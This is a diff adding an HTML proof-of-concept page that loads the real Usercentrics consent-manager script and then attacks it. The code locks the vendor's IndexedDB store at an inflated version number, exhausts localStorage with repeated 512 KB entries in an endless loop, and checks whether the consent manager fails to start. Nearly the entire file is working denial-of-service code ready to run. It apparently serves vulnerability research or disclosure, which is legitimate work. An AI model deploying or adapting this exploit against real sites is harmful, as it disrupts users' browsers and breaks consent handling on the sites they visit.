@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Usercentrics CMP Persistent DoS PoC</title>
+
+  <!-- LOAD REAL USERCENTRICS CMP -->
+  <script
+    id="usercentrics-cmp"
+    src="https://web.cmp.usercentrics.eu/ui/loader.js"
+    data-settings-id="0CcmHnvIacflQP"
+    async>
+  </script>
+</head>
+
+<body>
+<h3>Usercentrics CMP Persistent Storage DoS PoC</h3>
+<p>Open DevTools → Console</p>
+
+<script>
+const DB_NAME = "uc-dev-tracker-store";
+const NORMAL_VERSION = 1;
+const LOCKED_VERSION = 999;
+
+/* ================================
+   STEP 1 — Lock IndexedDB version
+   ================================ */
+function lockDbVersion() {
+  const req = indexedDB.open(DB_NAME, LOCKED_VERSION);
+  req.onupgradeneeded = () => {
+    console.log("[ATTACK] IndexedDB locked at version 999");
+  };
+}
+
+/* ================================
+   STEP 2 — Exhaust LocalStorage
+   ================================ */
+function exhaustStorage() {
+  try {
+    let i = 0;
+    while (true) {
+      localStorage.setItem(
+        `uc-consent-${i++}`,
+        "X".repeat(512 * 1024)
+      );
+    }
+  } catch (e) {
+    console.error("[STORAGE ERROR]", e.name);
+  }
+}
+
+/* ================================
+   STEP 3 — Observe CMP failure
+   ================================ */
+function observeCmpFailure() {
+  console.log("[CMP] Waiting for Usercentrics initialization…");
+
+  setTimeout(() => {
+    if (!window.UC_UI) {
+      console.error("[CRITICAL] Usercentrics CMP failed to initialize");
+    } else {
+      console.log("[CMP] UC_UI object detected");
+    }
+  }, 3000);
+}
+
+/* ================================
+   RUN PoC
+   ================================ */
+setTimeout(() => {
+  lockDbVersion();
+  exhaustStorage();
+  observeCmpFailure();
+}, 1000);
+</script>
+</body>
+</html>
